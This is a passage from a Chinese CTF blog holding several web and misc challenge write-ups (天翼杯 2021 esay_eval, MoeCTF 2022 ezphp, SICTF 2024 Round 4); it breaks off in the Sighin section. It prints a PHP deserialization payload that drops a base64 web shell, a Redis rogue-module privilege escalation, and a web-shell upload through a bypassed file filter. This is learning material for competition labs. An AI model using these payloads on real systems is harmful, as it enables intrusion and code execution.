    <content><![CDATA[<h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><h2 id="php反序列化-redis提权"><a href="#php反序列化-redis提权" class="headerlink" title="php反序列化 + redis提权"></a>php反序列化 + redis提权</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/364">https://www.nssctf.cn/problem/364</a></p>
<span id="more"></span>

<p>拿到题目，进行代码审计：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是php反序列化，触发A类中的eval函数进行命令执行，为了触发eval函数，调用 call()魔术方法，当访问到对象中不存在的方法时，触发call()方法，也就利用到了B类中的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>(); </span><br></pre></td></tr></table></figure>

<p>不过要注意绕过wakeup方法，否则命令将会被清空，如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过wakeup的执行</p>
<p>构造pop链：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;fputs(fopen(&#x27;123.php&#x27;,&#x27;w&#x27;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=\&quot;));&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;a=<span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;B&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;b&quot;:2:&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$p2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 传参：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?poc=O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:86:&quot;fputs(fopen(&#x27;123.php&#x27;,&#x27;w&#x27;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;));&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一句话木马写入123.php文件，访问文件：</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/1.png" alt="img"></p>
<p>发现system等函数被禁用，用蚁剑连接：</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/2.png" alt="img"></p>
<p>访问根目录，提示权限不足，只好查看当前目录下的文件</p>
<p>这里有vim缓存泄露：</p>
<p>使用 vim 编辑器 编辑文本时，系统会自动生成一个备份文件，编辑完成后，备份文件会被自动删除。</p>
<p>但是，当编辑意外终止时，这个备份文件就会保留，如果多次编辑文件都意外退出，备份文件并不会覆盖，而是以 swp、swo、swn 等其他格式，依次备份。</p>
<p>查看config.php.swp文件：</p>
<p>存在不可见字符，整理可见字符后大致是这些：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">define(&quot;REDIS_PASS&quot;,&quot;you_cannot_guess_it&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_DATABASE&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_PASSWOrd&quot;,&quot;&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_USERNAME&quot;,&quot;root&quot;);</span><br><span class="line"></span><br><span class="line">define(&quot;DB_HOST&quot;,&quot;localhost&quot;);</span><br></pre></td></tr></table></figure>



<p>泄露了redis的密码</p>
<p>Redis 中的 exp.so 文件可以进行redis提权。这是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。</p>
<p>下载exp.so文件：</p>
<p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<p>上传文件后用redis管理插件连接，输入密码：</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/3.png" alt="img"></p>
<p>执行命令载入模块，并命令执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line"></span><br><span class="line">system.exec &quot;ls /&quot;</span><br><span class="line"></span><br><span class="line">system.exec &quot;cat /f*&quot;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/4.png" alt="img"></p>
]]></content>
      <categories>
        <category>日常writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>php变量间接引用</title>
    <url>/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/</url>
    <content><![CDATA[<h1 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h1><h2 id="记一次php变量间接引用"><a href="#记一次php变量间接引用" class="headerlink" title="记一次php变量间接引用"></a>记一次php变量间接引用</h2><p>题目来源：[<a href="https://www.nssctf.cn/problem/3348">MoeCTF 2022]ezphp | NSSCTF</a></p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计一下，必须以GET或POST传入一个flag参数，才能绕过第一个exit，如果flag参数的值也同为flag，那会被第二个exit终止，如果flag参数不为flag的话，后面flag的值就会被新的值覆盖掉</p>
<p>分析一下两个foreach循环：形如传参name&#x3D;xtyy，那么就会使$key&#x3D;name $value&#x3D;xtyy</p>
<p>重点在于第二个foreach循环</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是变量的间接引用，相当于把$key替换成上面的name，也就会变成$name</p>
<p>也就是说，传入的?name&#x3D;xtyy就会变成$name&#x3D;$xtyy的传参，</p>
<p>如果这里传入a&#x3D;flag，就会把$flag的值储存在变量$a中，后面再让$flag&#x3D;$a，就可以把flag原本的值拿回来</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>

<p>其实这相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然如果传参：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;b=a&amp;flag=b</span><br></pre></td></tr></table></figure>

<p>只要能在最后把变量flag的值赋回来，都是可以的</p>
<p>成功的拿到了flag</p>
<p><img src="/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png" alt="image"></p>
]]></content>
      <categories>
        <category>日常writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SICTF 2024</title>
    <url>/2024/11/06/SICTF-2024-round4/</url>
    <content><![CDATA[<h1 id="SICTF-2024-Round-4"><a href="#SICTF-2024-Round-4" class="headerlink" title="SICTF 2024 #Round 4"></a><strong>SICTF 2024 #Round 4</strong></h1><p><img src="/2024/11/06/SICTF-2024-round4/1.jpg" alt="图片"></p>
<span id="more"></span>

<h2 id="Misc-5-5"><a href="#Misc-5-5" class="headerlink" title="Misc(5&#x2F;5)"></a><strong>Misc(5&#x2F;5)</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到!"></a><strong>签到!</strong></h3><p>不必多言，直接关注公众号，发送SICTF Round4即可</p>
<h3 id="派森"><a href="#派森" class="headerlink" title="派森"></a><strong>派森</strong></h3><p>按照谐音写出加密脚本，其实这里用语音识别应该也可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"><span class="comment">#from 提克有第爱慕 import *</span></span><br><span class="line">answer=[<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line">flag=<span class="comment">#&quot;SICTF&#123;&quot;+a+&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">ink = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>):</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i]),<span class="built_in">ord</span>(flag[i+<span class="number">2</span>])))</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i+<span class="number">1</span>]),<span class="built_in">ord</span>(flag[i+<span class="number">3</span>])))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">2</span>]))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">3</span>]))</span><br><span class="line"><span class="built_in">print</span>(ink)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>感觉第二个import没用到，不管他，直接逆向写出解密脚本，拿到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">ink = [<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ink), <span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i], ink[i+<span class="number">2</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i+<span class="number">1</span>], ink[i+<span class="number">3</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">2</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="模型的秘密"><a href="#模型的秘密" class="headerlink" title="模型的秘密"></a><strong>模型的秘密</strong></h3><p>拿到压缩包，给了大字典，直接字典爆破出密码</p>
<p>Advanced Archive Password Recovery 统计信息:</p>
<p>总计口令: 116</p>
<p>总计时间: 24ms </p>
<p>平均速度(口令&#x2F;秒): 4,833</p>
<p>这个文件的口令 : haldaemon</p>
<p>十六进制口令: 68 61 6c 64 61 65 6d 6f 6e </p>
<p>打开文件夹，是一个blender建模文件，修复文件头</p>
<p>如果不知道文件头是什么，而且网上也查不到的话，完全可以新建一个同类型文件查看</p>
<p><img src="/2024/11/06/SICTF-2024-round4/2.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/3.jpg" alt="img"></p>
<p>用blender4.2打开，得到flag</p>
<p>用其他版本的blender打开是正方体，在这里卡了半天</p>
<h3 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a><strong>Picture</strong></h3><p>打开文件夹，俩个图片和一个python脚本，应该是自定义加密</p>
<p>代码审计一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">flag = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width, height = flag.size</span><br><span class="line">image1 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">image2 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        r,g,b = flag.getpixel((i,j))</span><br><span class="line">        tr, tg, tb = randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>)</span><br><span class="line">        image1.putpixel((i,j),(tr,tg,tb))</span><br><span class="line">        image2.putpixel((i,j),(r-tr,g-tg,b-tb))</span><br><span class="line">image1.save(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">image2.save(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的异或加密脚本，直接逆向脚本，拿到flag.png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">flag2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">width, height = flag1.size</span><br><span class="line">image = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag1.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        tr1,tg1,tb1 = flag1.getpixel((i,j))</span><br><span class="line">        tr2,tg2,tb2 = flag2.getpixel((i,j))</span><br><span class="line">        image.putpixel((i,j),(tr1+tr2,tg1+tg2,tb1+tb2))</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>空白图片，stegsolve查看</p>
<p>拿到 flag<img src="/2024/11/06/SICTF-2024-round4/4.jpg" alt="img"></p>
<h3 id="外星信号-Ultra"><a href="#外星信号-Ultra" class="headerlink" title="外星信号 Ultra"></a><strong>外星信号 Ultra</strong></h3><p>图片末尾提示：</p>
<p>翻译一下是用苹果设备查看图片显示不同，应该是iDot png隐写</p>
<p> Apple 的 PNG 解码器有一个私有的功能：通过 <a href="https://link.zhihu.com/?target=https://www.hackerfactor.com/blog/index.php?/archives/895-Connecting-the-iDOTs.html">iDOT </a>进行并行解码，而其存在一个 BUG 或者说设计不严谨的地方</p>
<p>这原本是 Apple 为了 PNG 解码速度而做的一个优化 。按照 <a href="https://link.zhihu.com/?target=https://www.w3.org/TR/PNG/%2311Chunks">PNG 规范</a> ，PNG 图片分为多个数据块，图片内容的像素流会使用 <code>zlib.deflate</code> 算法压缩后存储在 IDAT 块中。按照标准可以把所有数据存储在一个大的 IDAT 块中，也可以分割存储在多个 IDAT 块中，这原本是为了编码解码时可控内存占用量而设计的，而没有考虑到并行解码，也就是说在对每一个 IDAT 块解压前并不会知道到其中包含了多少像素 。</p>
<p>苹果为了让 PNG 格式的图片可以并行解码并且兼容原本的 PNG 标准，把图片内容分为「前半」与「后半」2 部分，并把像素流分为多个 IDAT 块，然后在 PNG 文件里添加了一个 iDOT 辅助块，其中记录了「前半」「后半」的分隔位置（「后半」数据相对 iDOT 块的偏移值）和解压后的像素高度，这样用 Apple 的 PNG 编码器编码的 PNG 图片用 Apple 自家的 PNG 解码器解码就可以分为 2 个并行的过程，以此充分利用多核性能，同时这样的 PNG 图片也能被普通解码器解码</p>
<p>原理就不过多分析了，可以参考这篇文章：</p>
<p><a href="https://zhuanlan.zhihu.com/p/447989118">🦎 在不同设备上显示不一样内容的神奇 PNG 图片 - 知乎</a></p>
<p>直接用在线网站看到</p>
<p><a href="https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681">https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681</a></p>
<p><img src="/2024/11/06/SICTF-2024-round4/5.jpg" alt="img"></p>
<p>获得随机数种子，这里是伪随机数，写出解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">496534891</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_as_bytes</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_data = f.read()</span><br><span class="line">        decrypted_data = <span class="built_in">bytes</span>((byte ^ random.randint(<span class="number">10</span>, <span class="number">20</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> file_data))</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_to_file</span>(<span class="params">bytes_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line">enc = decrypt_file_as_bytes(<span class="string">&quot;data&quot;</span>) </span><br><span class="line">write_bytes_to_file(enc, <span class="string">&quot;decrypted_deepsea.wav&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到deepsea.wav，用deepsound打开，获得一个sea.wav文件，SSTV扫描，拿到压缩包key</p>
<p><img src="/2024/11/06/SICTF-2024-round4/6.jpg" alt="img"></p>
<p>解压得到</p>
<p><img src="/2024/11/06/SICTF-2024-round4/7.jpg" alt="img"></p>
<p>文件名说是base2048，直接解密</p>
<p><img src="/2024/11/06/SICTF-2024-round4/8.jpg" alt="img"></p>
<p>拿到flag</p>
<h2 id="Web-3-4"><a href="#Web-3-4" class="headerlink" title="Web(3&#x2F;4)"></a><strong>Web(3&#x2F;4)</strong></h2><h3 id="Upl0ad"><a href="#Upl0ad" class="headerlink" title="Upl0ad"></a><strong>Upl0ad</strong></h3><p>右键查看源代码</p>
<p>看到一个js函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validateFileType</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[type=&quot;file&quot;]&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> allowedExtensions = <span class="regexp">/(\.jpg|\.jpeg|\.png|\.pdf)$/i</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">exec</span>(fileInput.<span class="property">value</span>)) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;只允许上传 JPG、PNG 或 PDF 文件。&#x27;</span>);</span><br><span class="line">            fileInput.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 清空选择</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>前端过滤，只允许上传jpg jpeg png pdf格式文件</p>
<p>简单的前端绕过，文件上传，直接传马bp改后缀：</p>
<p><img src="/2024/11/06/SICTF-2024-round4/9.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/10.jpg" alt="img"></p>
<p>上传成功，跳转到页面，直接命令执行即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/06/SICTF-2024-round4/11.jpg" alt="img"></p>
<h3 id="Sighin"><a href="#Sighin" class="headerlink" title="Sighin"></a><strong>Sighin</strong></h3><p>进入页面直接看源码</p>
<p><img src="/2024/11/06/SICTF-2024-round4/12.jpg" alt="img"></p>
<p>到robots.txt看一眼</p>
<p>要求访问&#x2F;wh3re_1s_thi5_fl4g.php</p>
<p><img src="/2024/11/06/SICTF-2024-round4/13.jpg" alt="img"></p>
<p>写出解密脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;wKq=1MDcLg6yYsrnRYivbO7JoWQ9rBhCZuo4DlZOS7_I5+t=UKzp0hdV1FNL2EFd/nxam3cTbPARsw+8Eky5XUpfH0MeTQ3JXtkGf9qj_4NmlHi/SeIVaCAgxGj26vW8PBzu&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$s</span>[<span class="number">72</span>] . <span class="variable">$s</span>[<span class="number">116</span>] . <span class="variable">$s</span>[<span class="number">76</span>] . <span class="variable">$s</span>[<span class="number">113</span>] . <span class="variable">$s</span>[<span class="number">124</span>] . <span class="variable">$s</span>[<span class="number">35</span>] . <span class="variable">$s</span>[<span class="number">104</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">91</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">24</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">113</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">123</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span 